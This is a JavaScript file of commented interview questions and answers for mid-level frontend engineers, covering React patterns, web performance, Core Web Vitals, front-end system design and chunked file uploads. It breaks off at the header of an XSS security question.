/* ===================================================================
   MID-LEVEL FRONTEND ENGINEER — INTERVIEW Q&A BANK
   Target : 2–4 Years Experience
   Areas  : React & Architecture | Performance | System Design
            Security & Auth | Testing & CI/CD
   Format : Every question has a FULL detailed answer + code examples
=================================================================== */


/* ===================================================================
   SECTION 1 — REACT & COMPONENT ARCHITECTURE
=================================================================== */


/* -------------------------------------------------------------------
   Q1) You have a form with 10+ fields and it re-renders on every
       keystroke. How do you fix it?
   -------------------------------------------------------------------
   ROOT CAUSE:
   • All field values stored in one useState object at the top
   • Every keystroke calls setState → entire form re-renders
   • Every child input component re-renders even if its value didn't change
   -------------------------------------------------------------------
   ANSWER:

   There are 3 levels of fix depending on complexity:

   LEVEL 1 — Split state per field (simple forms)
   ─────────────────────────────────────────────
   Instead of one big object, give each field its own state.
   Now typing in "name" only re-renders the name input.

        // ❌ One object = everything re-renders on every keystroke
        const [form, setForm] = useState({
          name: '', email: '', phone: ''
        });

        // ✅ Split state — each field is independent
        const [name,  setName]  = useState('');
        const [email, setEmail] = useState('');
        const [phone, setPhone] = useState('');

   LEVEL 2 — Uncontrolled inputs with useRef (best performance)
   ─────────────────────────────────────────────────────────────
   The DOM tracks the value, not React.
   Zero re-renders while typing. Read values only on submit.

        const nameRef  = useRef();
        const emailRef = useRef();

        const handleSubmit = (e) => {
          e.preventDefault();
          const data = {
            name:  nameRef.current.value,
            email: emailRef.current.value,
          };
          submitToAPI(data);
        };

        return (
          <form onSubmit={handleSubmit}>
            <input ref={nameRef}  defaultValue="" />
            <input ref={emailRef} defaultValue="" />
            <button type="submit">Submit</button>
          </form>
        );

   LEVEL 3 — React Hook Form (best for complex/validated forms)
   ─────────────────────────────────────────────────────────────
   Uses uncontrolled inputs under the hood.
   Gives you validation, error handling, with ZERO re-renders on typing.

        import { useForm } from 'react-hook-form';

        const { register, handleSubmit, formState: { errors } } = useForm();

        const onSubmit = (data) => submitToAPI(data);

        return (
          <form onSubmit={handleSubmit(onSubmit)}>
            <input
              {...register('name', { required: 'Name is required' })}
            />
            {errors.name && <span>{errors.name.message}</span>}

            <input
              {...register('email', { pattern: /^\S+@\S+$/i })}
            />
            <button type="submit">Submit</button>
          </form>
        );

   KEY INSIGHT:
   • You don't NEED React state to track what the user is typing
   • Only use controlled inputs when the UI must react to
     the value IN REAL TIME (live search, character counter,
     dependent field logic like "show field B only if field A = X")
   • For everything else — uncontrolled is faster and simpler
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q2) A teammate's component fetches data, handles UI state,
       manages a WebSocket AND renders — all in 400 lines.
       How do you refactor it?
   -------------------------------------------------------------------
   ROOT CAUSE:
   • No separation of concerns
   • Impossible to test individual pieces
   • Any change risks breaking unrelated behavior
   -------------------------------------------------------------------
   ANSWER:

   Use the CUSTOM HOOK pattern to split by responsibility.
   The rule: a component should only be responsible for rendering.
   Everything else belongs in a hook.

   STEP 1 — Identify the concerns in the component:
   ─────────────────────────────────────────────────
        1. Data fetching (user profile)
        2. WebSocket management (live notifications)
        3. UI state (loading, error, modal open/close)
        4. Rendering JSX

   STEP 2 — Extract each concern into its own hook:
   ─────────────────────────────────────────────────

        // Hook 1: Data fetching
        const useUser = (userId) => {
          const [user,    setUser]    = useState(null);
          const [loading, setLoading] = useState(true);
          const [error,   setError]   = useState(null);

          useEffect(() => {
            const controller = new AbortController();
            fetch(`/api/users/${userId}`, { signal: controller.signal })
              .then(r => r.json())
              .then(data => { setUser(data); setLoading(false); })
              .catch(err => {
                if (err.name !== 'AbortError') setError(err.message);
              });
            return () => controller.abort(); // cleanup on unmount
          }, [userId]);

          return { user, loading, error };
        };

        // Hook 2: WebSocket notifications
        const useNotifications = () => {
          const [notifications, setNotifications] = useState([]);

          useEffect(() => {
            const ws = new WebSocket('wss://api.example.com/notify');

            ws.onmessage = (e) => {
              const notification = JSON.parse(e.data);
              setNotifications(prev => [notification, ...prev]);
            };

            ws.onerror = (err) => console.error('WS error:', err);

            return () => ws.close(); // cleanup on unmount
          }, []);

          return notifications;
        };

        // Hook 3: UI state
        const useDashboardUI = () => {
          const [modalOpen, setModalOpen] = useState(false);
          const openModal  = () => setModalOpen(true);
          const closeModal = () => setModalOpen(false);
          return { modalOpen, openModal, closeModal };
        };

   STEP 3 — Component is now ONLY presentation:
   ──────────────────────────────────────────────

        const UserDashboard = ({ userId }) => {
          const { user, loading, error }     = useUser(userId);
          const notifications                = useNotifications();
          const { modalOpen, openModal,
                  closeModal }               = useDashboardUI();

          if (loading) return <Spinner />;
          if (error)   return <ErrorMessage message={error} />;

          return (
            <div>
              <UserProfile user={user} onEdit={openModal} />
              <NotificationList items={notifications} />
              {modalOpen && (
                <EditModal user={user} onClose={closeModal} />
              )}
            </div>
          );
        };

   BENEFITS:
   • Each hook can be unit-tested independently
   • useUser can be reused anywhere in the app
   • Component is readable at a glance
   • Changes to WebSocket logic can't accidentally break form logic
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q3) What's the difference between useEffect and useLayoutEffect?
       When does using the wrong one break something?
   -------------------------------------------------------------------
   ANSWER:

   EXECUTION ORDER:
   ────────────────
        React renders JSX
             ↓
        Commits changes to real DOM
             ↓
        useLayoutEffect fires  ← BEFORE browser paints
             ↓
        Browser paints (user sees the screen)
             ↓
        useEffect fires        ← AFTER browser paints

   THE CLASSIC BREAKING EXAMPLE — Tooltip positioning:
   ─────────────────────────────────────────────────────

        // ❌ BROKEN — useEffect causes visible flicker
        const Tooltip = ({ targetRef, text }) => {
          const [pos, setPos] = useState({ top: 0, left: 0 });

          useEffect(() => {
            const rect = targetRef.current.getBoundingClientRect();
            setPos({ top: rect.bottom + 8, left: rect.left });
            // Problem: browser already painted tooltip at top:0, left:0
            // Then it jumps to correct position — user sees a flash
          }, []);

          return (
            <div style={{ position: 'absolute', ...pos }}>
              {text}
            </div>
          );
        };

        // ✅ FIXED — useLayoutEffect prevents the flicker
        const Tooltip = ({ targetRef, text }) => {
          const [pos, setPos] = useState({ top: 0, left: 0 });

          useLayoutEffect(() => {
            const rect = targetRef.current.getBoundingClientRect();
            setPos({ top: rect.bottom + 8, left: rect.left });
            // Position is calculated and set BEFORE browser paints
            // User only ever sees the correct position — no flash
          }, []);

          return (
            <div style={{ position: 'absolute', ...pos }}>
              {text}
            </div>
          );
        };

   ANOTHER EXAMPLE — Scroll restoration:
   ────────────────────────────────────────

        // ❌ useEffect — user briefly sees page at top before scroll
        useEffect(() => {
          window.scrollTo(0, savedScrollPos);
        }, []);

        // ✅ useLayoutEffect — scroll happens before paint, no jump
        useLayoutEffect(() => {
          window.scrollTo(0, savedScrollPos);
        }, []);

   SIMPLE RULE:
   • 95% of the time → useEffect (data fetching, subscriptions, timers)
   • Use useLayoutEffect ONLY when:
     → You read from the DOM  (getBoundingClientRect, scrollTop)
     → AND you must update something before the user sees it
     → AND using useEffect causes a visible flicker
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q4) What's wrong with object/array literals directly in JSX props?
       When does it actually matter?
   -------------------------------------------------------------------
   ANSWER:

   THE PROBLEM — new reference on every render:
   ─────────────────────────────────────────────

        const Parent = () => {
          return (
            <Child
              // ❌ New object created on EVERY render of Parent
              style={{ color: 'red', fontSize: 16 }}

              // ❌ New array created on EVERY render of Parent
              items={['apple', 'banana', 'cherry']}

              // ❌ New function created on EVERY render of Parent
              onClick={() => console.log('clicked')}
            />
          );
        };

   JavaScript compares objects by reference not by value:
        { color: 'red' } === { color: 'red' }  // false — different objects!

   So React.memo thinks the props changed and re-renders Child anyway.

   THE FIX:
   ─────────

        // ✅ Static values — move outside component (never recreated)
        const CHILD_STYLE = { color: 'red', fontSize: 16 };
        const ITEMS       = ['apple', 'banana', 'cherry'];

        const Parent = () => {
          // ✅ Functions — wrap in useCallback for stable reference
          const handleClick = useCallback(() => {
            console.log('clicked');
          }, []); // empty deps = created once, never recreated

          // ✅ Computed objects — wrap in useMemo
          const dynamicStyle = useMemo(() => ({
            color: isActive ? 'blue' : 'red',
            fontSize: 16,
          }), [isActive]); // only recreated when isActive changes

          return (
            <Child
              style={dynamicStyle}
              items={ITEMS}
              onClick={handleClick}
            />
          );
        };

   CRITICAL CAVEAT — when does this actually matter?
   ──────────────────────────────────────────────────

        // This optimization ONLY matters when Child is memoized:
        const Child = React.memo(({ style, items, onClick }) => {
          // React.memo does shallow comparison of props
          // Stable references = no re-render
          // New references = re-renders even if values look the same
          return <div style={style}>...</div>;
        });

        // Without React.memo → Child re-renders regardless
        // So useCallback / useMemo just add overhead with zero benefit

   GOLDEN RULE:
   • Don't add useCallback / useMemo everywhere by default
   • First confirm re-renders are a real performance problem (Profile first)
   • Then add React.memo to the child
   • Then stabilize the props with useCallback / useMemo
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q5) What is the stale closure problem and how does useRef fix it?
   -------------------------------------------------------------------
   ANSWER:

   WHAT IS A STALE CLOSURE?
   ─────────────────────────
   When a function "closes over" a variable from the time it was created,
   it captures that version of the variable — even if it has since changed.

        // ❌ Classic stale closure in a game loop
        const [dir, setDir] = useState({ x: 1, y: 0 });

        useEffect(() => {
          const interval = setInterval(() => {
            console.log(dir); // Always logs { x: 1, y: 0 } — the INITIAL value
            // Even after the user presses a key and dir changes,
            // this interval still sees the old value
            // because it "closed over" dir when the interval was created
          }, 200);
          return () => clearInterval(interval);
        }, []); // Empty deps = interval never re-created = stale forever

   WHY THIS HAPPENS:
   ──────────────────
   The interval callback is created ONCE (because deps = []).
   It captures `dir` at that moment: { x: 1, y: 0 }.
   Even when React updates `dir` to { x: 0, y: -1 },
   the old interval still points to the old closure.

   FIX — useRef as a "mutable escape hatch":
   ───────────────────────────────────────────

        const [dir, setDir] = useState({ x: 1, y: 0 });

        // Create a ref that always points to the LATEST dir
        const dirRef = useRef(dir);

        // Keep ref in sync with state on every render
        // This line runs on every render, BEFORE effects
        dirRef.current = dir;

        useEffect(() => {
          const interval = setInterval(() => {
            // ✅ dirRef.current always has the LATEST value
            // Refs are mutable — reading .current gives current value
            // No stale closure problem
            console.log(dirRef.current); // always the latest direction
          }, 200);
          return () => clearInterval(interval);
        }, []); // Can still keep empty deps — ref solves the staleness

   THE KEY DIFFERENCE:
        State (dir)       → immutable snapshot, triggers re-render
        Ref (dirRef)      → mutable container, no re-render on change
                            always readable as the latest value

   REAL USE CASES FOR THIS PATTERN:
   • Game loops reading rapidly changing state
   • Event handlers inside setInterval or setTimeout
   • WebSocket handlers that need current state
   • Any long-lived callback that needs fresh values
   -------------------------------------------------------------------*/


/* ===================================================================
   SECTION 2 — PERFORMANCE & OPTIMIZATION
=================================================================== */


/* -------------------------------------------------------------------
   Q1) After a deploy, bundle jumped from 280kb to 890kb.
       How do you find and fix it?
   -------------------------------------------------------------------
   ANSWER:

   STEP 1 — Visualize the bundle (most important step):
   ─────────────────────────────────────────────────────

        # For Webpack:
        npx webpack-bundle-analyzer dist/stats.json

        # For Vite:
        npx vite-bundle-analyzer
        # or add to vite.config.js:
        import { visualizer } from 'rollup-plugin-visualizer';
        plugins: [visualizer({ open: true })]

   This opens a treemap showing exactly what's inside your bundle.
   Look for unexpectedly large rectangles.

   STEP 2 — Common culprits and their fixes:
   ──────────────────────────────────────────

        // ❌ CULPRIT 1: Importing entire lodash (72kb)
        import _ from 'lodash';
        const grouped = _.groupBy(items, 'category');

        // ✅ FIX: Import only what you need (3kb)
        import groupBy from 'lodash/groupBy';
        const grouped = groupBy(items, 'category');

        // Or use native alternatives:
        const grouped = Object.groupBy(items, (i) => i.category);

        // ❌ CULPRIT 2: moment.js (232kb — includes ALL locale files)
        import moment from 'moment';
        moment().format('MMMM Do YYYY');

        // ✅ FIX: Replace with date-fns (tree-shakeable, pay for what you use)
        import { format } from 'date-fns'; // only ~3kb
        format(new Date(), 'MMMM do yyyy');

        // ❌ CULPRIT 3: Barrel file imports (index.js re-exports everything)
        import { Button } from '../components'; // pulls in ENTIRE component tree

        // ✅ FIX: Import directly from the file
        import Button from '../components/Button/Button';

        // ❌ CULPRIT 4: Heavy library not lazy-loaded
        import { PDFViewer } from 'react-pdf'; // 500kb loaded upfront for everyone

        // ✅ FIX: Dynamic import — only loaded when actually needed
        const PDFViewer = lazy(() => import('react-pdf').then(m => ({
          default: m.PDFViewer
        })));

   STEP 3 — Lazy load all routes (biggest single win):
   ─────────────────────────────────────────────────────

        // ❌ All pages downloaded upfront — user on /home
        // gets the code for /reports (with heavy charting library) too
        import Dashboard from './pages/Dashboard';
        import Reports   from './pages/Reports';
        import Settings  from './pages/Settings';

        // ✅ Each page only downloaded when user navigates to it
        import { lazy, Suspense } from 'react';

        const Dashboard = lazy(() => import('./pages/Dashboard'));
        const Reports   = lazy(() => import('./pages/Reports'));
        const Settings  = lazy(() => import('./pages/Settings'));

        // Wrap routes in Suspense
        <Suspense fallback={<PageSkeleton />}>
          <Routes>
            <Route path="/"        element={<Dashboard />} />
            <Route path="/reports" element={<Reports />} />
            <Route path="/settings"element={<Settings />} />
          </Routes>
        </Suspense>

   STEP 4 — Verify the fix with size-limit (automate in CI):
   ──────────────────────────────────────────────────────────

        // package.json
        {
          "size-limit": [
            { "path": "dist/index.js", "limit": "300 kb" }
          ],
          "scripts": {
            "size": "size-limit"
          }
        }
        // Now CI fails if bundle exceeds 300kb — catches regressions early
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q2) Your app's LCP is 4.2 seconds on mobile. How do you
       investigate and fix it?
   -------------------------------------------------------------------
   ANSWER:

   WHAT IS LCP?
   • Largest Contentful Paint — measures when the biggest visible
     element (hero image, h1, banner) becomes visible to the user
   • Good: < 2.5s | Needs improvement: 2.5–4s | Poor: > 4s

   STEP 1 — Identify the LCP element:
   ─────────────────────────────────────

        // Run in DevTools console to see what element IS the LCP:
        new PerformanceObserver((list) => {
          const entries = list.getEntries();
          const last    = entries[entries.length - 1];
          console.log('LCP element:', last.element);
          console.log('LCP time:', last.startTime);
        }).observe({ type: 'largest-contentful-paint', buffered: true });

   STEP 2 — Fix based on what the LCP element is:
   ─────────────────────────────────────────────────

   IF IT'S AN IMAGE:
   ──────────────────

        // ❌ Image discovered late — browser finds it after parsing HTML,
        //    then CSS, then JS before it even starts downloading
        <img src="/hero.jpg" />

        // ✅ FIX 1: Preload the image — browser fetches it immediately
        <link rel="preload" as="image" href="/hero.jpg" />

        // ✅ FIX 2: Mark it as high priority
        <img src="/hero.jpg" fetchpriority="high" loading="eager" />

        // ❌ NEVER lazy load the LCP image
        <img src="/hero.jpg" loading="lazy" /> // delays it even more!

        // ✅ FIX 3: Use modern formats (WebP/AVIF = 30-50% smaller)
        <picture>
          <source srcset="/hero.avif" type="image/avif" />
          <source srcset="/hero.webp" type="image/webp" />
          <img src="/hero.jpg" alt="Hero" fetchpriority="high" />
        </picture>

        // ✅ FIX 4: Serve from CDN close to user
        // Use Cloudflare / CloudFront with global edge nodes

   IF IT'S A TEXT ELEMENT:
   ────────────────────────

        // ❌ Web font not loaded → browser shows invisible text
        //    LCP element is invisible until font arrives
        @font-face {
          font-family: 'MyFont';
          src: url('/fonts/myfont.woff2');
          /* no font-display = block = invisible until loaded */
        // }

        // // ✅ FIX: font-display: swap shows text immediately
        // @font-face {
        //   font-family: 'MyFont';
        //   src: url('/fonts/myfont.woff2');
        //   font-display: swap; /* show fallback font → swap when ready */
        // }

        // ✅ Also preload the font file
  //       <link rel="preload" as="font" type="font/woff2"
  //             href="/fonts/myfont.woff2" crossorigin />

  //  IF TTFB (Time To First Byte) IS HIGH (> 600ms):
  //  ─────────────────────────────────────────────────
  //  • The problem is SERVER RESPONSE TIME, not frontend
  //  • Fixes: add CDN, enable server-side caching, use edge rendering
  //  • Check in DevTools: Network tab → first HTML request → TTFB row

  //  IF RENDER-BLOCKING RESOURCES ARE THE ISSUE:
  //  ─────────────────────────────────────────────

  //       // ❌ Synchronous CSS blocks render until fully downloaded
  //       <link rel="stylesheet" href="/styles.css" />

  //       // ✅ Load non-critical CSS asynchronously
  //       <link rel="preload" href="/non-critical.css" as="style"
  //             onload="this.onload=null;this.rel='stylesheet'" />

  //       // ❌ Synchronous script blocks HTML parsing
  //       <script src="/analytics.js"></script>

  //       // ✅ Defer non-critical scripts
  //       <script src="/analytics.js" defer></script>
  //  -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q3) What are Core Web Vitals? What causes each to be poor
       and what specifically fixes each?
   -------------------------------------------------------------------
   ANSWER:

   Core Web Vitals = Google's metrics for real-world user experience.
   They directly affect your SEO ranking and perceived performance.

   ┌─────────────────────────────────────────────────────────────────┐
   │  METRIC         MEASURES            GOOD      POOR             │
   │  LCP            Loading speed       < 2.5s    > 4.0s           │
   │  INP            Interactivity       < 200ms   > 500ms          │
   │  CLS            Visual stability    < 0.1     > 0.25           │
   └─────────────────────────────────────────────────────────────────┘

   LCP — LARGEST CONTENTFUL PAINT:
   ────────────────────────────────
   Causes of poor LCP:
   • Large unoptimized images (no compression, wrong format)
   • No CDN — assets served from single origin far from user
   • Render-blocking CSS / JS delaying first paint
   • Slow server TTFB

   Fixes:  (see Q2 above for full detail)
   • Preload LCP image with fetchpriority="high"
   • Serve WebP/AVIF instead of PNG/JPG
   • Use CDN with global edge nodes
   • Defer non-critical scripts and CSS

   INP — INTERACTION TO NEXT PAINT (replaced FID in 2024):
   ─────────────────────────────────────────────────────────
   Measures: time from user interaction (click, keypress, tap)
             to when the browser visually responds

   Causes of poor INP:
   • Long JavaScript tasks (> 50ms) blocking the main thread
   • Heavy computation happening synchronously during interaction
   • Too many event listeners, expensive re-renders

        // ❌ Long synchronous task blocks response to user click
        const handleClick = () => {
          const result = processMillionRecords(data); // 300ms of blocking work
          setResult(result); // user's click feels "frozen" for 300ms
        };

        // ✅ FIX 1: Move work to a Web Worker
        const worker = new Worker('./processor.js');
        const handleClick = () => {
          worker.postMessage(data);
          worker.onmessage = (e) => setResult(e.data);
          // Main thread stays free → UI responds instantly
        };

        // ✅ FIX 2: Break work into small chunks with scheduler
        const handleClick = async () => {
          for (const chunk of chunks) {
            await scheduler.postTask(() => processChunk(chunk),
              { priority: 'background' });
          }
        };

   CLS — CUMULATIVE LAYOUT SHIFT:
   ─────────────────────────────────
   Measures: how much content unexpectedly moves while loading.
   Nothing is more frustrating than clicking a button that just moved.

   Causes of poor CLS:
   • Images without width/height attributes
   • Ads, iframes, embeds loaded without reserved space
   • Web fonts swapping causing text to reflow
   • Dynamic content injected above existing content

        // ❌ Image with no dimensions — browser doesn't know
        //    how much space to reserve → layout shifts when image loads
        <img src="/photo.jpg" alt="Product" />

        // ✅ FIX: Always specify dimensions
        <img src="/photo.jpg" alt="Product" width={800} height={600} />

        // ✅ Or use CSS aspect-ratio to reserve space
        img {
          aspect-ratio: 800 / 600;
          width: 100%;
          height: auto;
        }

        // ❌ Ad / dynamic content inserted above existing content
        <AdBanner />      // loads 2 seconds later, pushes everything down
        <ArticleContent />

        // ✅ FIX: Reserve space before content loads
        <div style={{ minHeight: '250px', width: '100%' }}>
          <AdBanner />
        </div>
        <ArticleContent />
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q4) What is debouncing vs throttling?
       Give a real use case where using the wrong one causes a bug.
   -------------------------------------------------------------------
   ANSWER:

   DEBOUNCE — fires AFTER user STOPS doing something for X ms:
   ─────────────────────────────────────────────────────────────
        • Each new event RESETS the timer
        • Only fires when there's a pause/silence
        • Mental model: "Wait for the dust to settle"

        const debounce = (fn, delay) => {
          let timer;
          return (...args) => {
            clearTimeout(timer);               // reset on each call
            timer = setTimeout(() => fn(...args), delay);
          };
        };

        // Perfect use case: search input
        const handleSearch = debounce((query) => {
          fetchResults(query); // only fires when user stops typing
        }, 300);

        // Without debounce: fires on EVERY keystroke
        // User types "react hooks" (10 chars) = 10 API calls
        // With debounce:    fires once after user pauses
        // User types "react hooks" = 1 API call

   THROTTLE — fires AT MOST once every X ms:
   ───────────────────────────────────────────
        • Timer IGNORES new events until the interval passes
        • Guarantees regular execution during continuous activity
        • Mental model: "Fire regularly, no matter what"

        const throttle = (fn, limit) => {
          let lastCall = 0;
          return (...args) => {
            const now = Date.now();
            if (now - lastCall >= limit) {
              lastCall = now;
              fn(...args);
            }
          };
        };

        // Perfect use case: scroll handler
        const handleScroll = throttle(() => {
          updateProgressBar(window.scrollY);
        }, 100); // at most 10 times per second

   THE BUG — using the wrong one:
   ────────────────────────────────

        // ❌ WRONG: Debouncing a scroll handler
        window.addEventListener('scroll', debounce(updateNavbar, 200));
        // Bug: navbar only updates 200ms AFTER user STOPS scrolling
        // While scrolling fast, navbar never updates → broken UX
        // Debounce waits for "silence" — scrolling never has silence

        // ❌ WRONG: Throttling a search input
        input.addEventListener('input', throttle(searchAPI, 500));
        // Bug: user types "cat" quickly in < 500ms
        // Only "c" is searched — "cat" search never fires
        // User sees results for "c" not "cat" → confusing wrong results

        // ✅ CORRECT:
        // Search input     → debounce  (wait for pause, then fire once)
        // Scroll handler   → throttle  (fire regularly while scrolling)
        // Resize handler   → throttle  (fire regularly while resizing)
        // Button click     → debounce  (prevent accidental double-clicks)
        // Mousemove        → throttle  (fire at controlled rate)
        // Form autosave    → debounce  (save after user stops typing)
   -------------------------------------------------------------------*/


/* ===================================================================
   SECTION 3 — SYSTEM DESIGN
=================================================================== */


/* -------------------------------------------------------------------
   Q1) Design a notification system that works across browser
       tabs and survives page refresh.
   -------------------------------------------------------------------
   ANSWER:

   This problem has 3 distinct layers that each solve a different need:

   LAYER 1 — PERSISTENCE (survive page refresh):
   ───────────────────────────────────────────────

        // Use localStorage for simple cases
        // Use IndexedDB for large datasets or complex queries

        const STORAGE_KEY = 'user_notifications';

        const saveNotifications = (notifications) => {
          localStorage.setItem(STORAGE_KEY, JSON.stringify(notifications));
        };

        const loadNotifications = () => {
          const stored = localStorage.getItem(STORAGE_KEY);
          return stored ? JSON.parse(stored) : [];
        };

        // On app start — hydrate from storage
        const [notifications, setNotifications] = useState(loadNotifications);

   LAYER 2 — CROSS-TAB SYNC (BroadcastChannel API):
   ──────────────────────────────────────────────────

        // All tabs on the same origin can send/receive messages
        // No server required — direct browser-to-browser communication

        const channel = new BroadcastChannel('notifications_channel');

        // When a new notification arrives in THIS tab:
        const addNotification = (notification) => {
          setNotifications(prev => {
            const updated = [notification, ...prev];
            saveNotifications(updated);                    // persist
            channel.postMessage({                          // notify other tabs
              type: 'NEW_NOTIFICATION',
              notification
            });
            return updated;
          });
        };

        // Listen for notifications from OTHER tabs:
        useEffect(() => {
          channel.onmessage = (event) => {
            if (event.data.type === 'NEW_NOTIFICATION') {
              // Read from shared localStorage — all tabs now in sync
              setNotifications(loadNotifications());
            }
            if (event.data.type === 'MARK_READ') {
              setNotifications(prev =>
                prev.map(n =>
                  n.id === event.data.id ? { ...n, read: true } : n
                )
              );
            }
          };
          return () => channel.close();
        }, []);

   LAYER 3 — REAL-TIME DELIVERY (Server-Sent Events):
   ─────────────────────────────────────────────────────

        // SSE = server pushes to client, simpler than WebSocket
        // Auto-reconnects, works over HTTP/2, no library needed

        const useNotificationStream = (userId) => {
          const addNotification = useNotificationStore(s => s.add);

          useEffect(() => {
            const es = new EventSource(
              `/api/notifications/stream?userId=${userId}`
            );

            es.onmessage = (e) => {
              const notification = JSON.parse(e.data);
              addNotification(notification); // triggers cross-tab sync too
            };

            es.onerror = () => {
              // EventSource auto-reconnects by default
              console.log('SSE reconnecting...');
            };

            return () => es.close();
          }, [userId]);
        };

   COMPLETE FLOW:
   ──────────────
        Server pushes notification via SSE
             ↓
        Active tab receives it, saves to localStorage
             ↓
        BroadcastChannel notifies all other open tabs
             ↓
        All tabs update their UI simultaneously
             ↓
        User refreshes → loads from localStorage → sees all notifications
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q2) When would you choose SSR vs SSG vs CSR vs ISR?
       Give REAL tradeoffs, not just "SSR is faster."
   -------------------------------------------------------------------
   ANSWER:

   CSR — CLIENT SIDE RENDERING (Create React App, Vite):
   ───────────────────────────────────────────────────────
        What happens: Browser downloads empty HTML + JS bundle,
                      JS runs, fetches data, renders content.

        Timeline:
          Request → empty HTML (instant)
                  → JS downloads (1-3s on slow connections)
                  → JS executes (100-500ms)
                  → API fetch (100-500ms)
                  → User sees content (2-4s total)

        ✅ Use when: dashboard, admin panel, SaaS behind login
                    (SEO doesn't matter, users are authenticated)
        ✅ Cheapest to host — just static files on a CDN
        ❌ Bad for SEO — crawlers see empty HTML
        ❌ Slow first load — especially on mobile / slow connection

   SSG — STATIC SITE GENERATION (Next.js getStaticProps):
   ────────────────────────────────────────────────────────
        What happens: HTML pre-built at DEPLOY TIME.
                      Served instantly from CDN globally.

        Timeline:
          Request → pre-built HTML (instant from CDN)
                  → hydration (JS loads in background)

        ✅ Use when: blog, docs, marketing site, landing pages
        ✅ Fastest possible load — no server, no DB query at runtime
        ✅ Best SEO — full HTML served to crawlers
        ❌ Data is STALE until next deploy
        ❌ 50,000 product pages = 50,000 files to pre-generate (slow builds)

   SSR — SERVER SIDE RENDERING (Next.js getServerSideProps):
   ───────────────────────────────────────────────────────────
        What happens: HTML built PER REQUEST on the server.
                      Server fetches data → renders HTML → sends to browser.

        Timeline:
          Request → server fetches data (100-500ms)
                  → server renders HTML (10-50ms)
                  → browser receives full HTML (ready to read immediately)
                  → JS hydrates (background)

        ✅ Use when: personalized pages (user-specific content),
                    real-time data that must be indexed by SEO
                    (news articles, product pages with live inventory)
        ✅ Always fresh data
        ❌ Every request hits your server → higher cost
        ❌ Slower TTFB than SSG (no CDN caching of responses)
        ❌ Must manage server infrastructure

   ISR — INCREMENTAL STATIC REGENERATION (Next.js revalidate):
   ─────────────────────────────────────────────────────────────
        What happens: Pages are static UNTIL they expire.
                      After expiry, next request triggers a background rebuild.
                      Users always get a response (never wait for rebuild).

        // In Next.js:
        export async function getStaticProps() {
          const data = await fetchProducts();
          return {
            props: { data },
            revalidate: 60 // rebuild this page in background every 60 seconds
          };
        }

        ✅ Use when: e-commerce product pages, news articles, pricing pages
                    (data changes but not per-second)
        ✅ CDN-fast responses AND relatively fresh data
        ❌ Users might see data up to 60s stale (or whatever revalidate is)
        ❌ "Stale while revalidate" can confuse users if data changes a lot

   DECISION GUIDE:
   ────────────────
        Is it behind login?           → CSR
        Is content static/rarely changes? → SSG
        Is content personalized per user? → SSR
        Does content change hourly/daily? → ISR
        Is real-time data + SEO needed?   → SSR
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q3) Design a large file upload system that handles 1GB+ files,
       shows progress, supports pause/resume, and handles network drops.
   -------------------------------------------------------------------
   ANSWER:

   WHY YOU CAN'T JUST SEND ONE REQUEST:
   • 1GB file = browser likely runs out of memory reading it
   • Any network interruption = restart from zero
   • Server request timeout = upload fails at 99%
   • No progress possible with single request

   SOLUTION — CHUNKED UPLOAD:
   ───────────────────────────

   STEP 1: Split the file into chunks

        const CHUNK_SIZE = 5 * 1024 * 1024; // 5MB per chunk

        const createChunks = (file) => {
          const chunks = [];
          let start = 0;
          while (start < file.size) {
            chunks.push({
              index: chunks.length,
              blob:  file.slice(start, start + CHUNK_SIZE), // File.slice()
              start,
              end: Math.min(start + CHUNK_SIZE, file.size),
            });
            start += CHUNK_SIZE;
          }
          return chunks;
        };
        // 1GB file / 5MB chunks = 205 chunks

   STEP 2: Generate a unique upload ID (for resume support)

        const getUploadId = async (file) => {
          // Hash the file metadata to identify it uniquely
          const hashBuffer = await crypto.subtle.digest(
            'SHA-256',
            new TextEncoder().encode(`${file.name}-${file.size}-${file.lastModified}`)
          );
          return Array.from(new Uint8Array(hashBuffer))
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');
        };

   STEP 3: Upload chunks with progress tracking

        const uploadFile = async (file, onProgress) => {
          const uploadId = await getUploadId(file);
          const chunks   = createChunks(file);

          // Ask server which chunks it already has (for resume)
          const { uploadedChunks } = await fetch(
            `/api/upload/status/${uploadId}`
          ).then(r => r.json());

          let completed = uploadedChunks.length;

          for (const chunk of chunks) {
            // Skip chunks already uploaded
            if (uploadedChunks.includes(chunk.index)) continue;

            const formData = new FormData();
            formData.append('chunk',    chunk.blob);
            formData.append('index',    chunk.index);
            formData.append('uploadId', uploadId);
            formData.append('total',    chunks.length);

            await fetch('/api/upload/chunk', {
              method: 'POST',
              body:   formData,
            });

            completed++;
            onProgress(Math.round((completed / chunks.length) * 100));
          }

          // Tell server all chunks are uploaded — assemble the file
          await fetch('/api/upload/complete', {
            method: 'POST',
            body: JSON.stringify({ uploadId, filename: file.name }),
            headers: { 'Content-Type': 'application/json' },
          });
        };

   STEP 4: Handle pause and resume

        const [isPaused,  setIsPaused]  = useState(false);
        const pauseRef = useRef(false);

        const handlePause = () => {
          pauseRef.current = true;  // signal the upload loop to stop
          setIsPaused(true);
        };

        const handleResume = () => {
          pauseRef.current = false;
          setIsPaused(false);
          uploadFile(file, setProgress); // restart — server tells us where we left off
        };

        // Inside the upload loop, check pause flag:
        for (const chunk of chunks) {
          while (pauseRef.current) {
            await new Promise(resolve => setTimeout(resolve, 100));
          }
          // ... upload chunk
        }

   STEP 5: Handle network drops automatically

        // Retry failed chunks with exponential backoff
        const uploadChunkWithRetry = async (chunk, retries = 3) => {
          for (let attempt = 0; attempt < retries; attempt++) {
            try {
              await uploadChunk(chunk);
              return; // success
            } catch (err) {
              if (attempt === retries - 1) throw err;
              const delay = Math.pow(2, attempt) * 1000; // 1s, 2s, 4s
              await new Promise(resolve => setTimeout(resolve, delay));
            }
          }
        };
   -------------------------------------------------------------------*/


/* ===================================================================
   SECTION 4 — SECURITY & AUTH
=================================================================== */


/* -------------------------------------------------------------------
   Q1) An XSS vulnerability was found in your React app even
       though you're using JSX. How is it possible and how do you fix it?
   -------------------------------------------------------------------
